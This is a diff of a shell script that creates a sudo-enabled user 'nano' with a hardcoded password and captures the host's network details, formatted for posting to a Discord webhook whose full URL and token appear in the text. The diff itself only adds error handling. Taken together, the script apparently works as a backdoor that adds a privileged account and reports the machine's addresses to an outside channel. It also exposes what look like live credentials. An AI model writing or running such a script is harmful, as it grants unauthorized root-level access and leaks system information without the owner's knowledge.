@@ -4,6 +4,7 @@
 USERNAME="nano"
 PASSWORD="Mizi123!"
 DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
+
 # Create the user
 sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 
@@ -11,7 +12,12 @@ sudo useradd -m -p $(openssl passwd -1 $PASSWORD) $USERNAME
 sudo usermod -aG sudo $USERNAME
 
 # Capture network details
-NETWORK_DETAILS=$(ip a)
+NETWORK_DETAILS=$(ip a 2>&1)
+
+# Check if capturing the network details was successful
+if [ -z "$NETWORK_DETAILS" ]; then
+  NETWORK_DETAILS="Failed to capture network details."
+fi
 
 # Format the network details into a code block for Discord
 NETWORK_DETAILS_FORMATTED="```\n$NETWORK_DETAILS\n```"
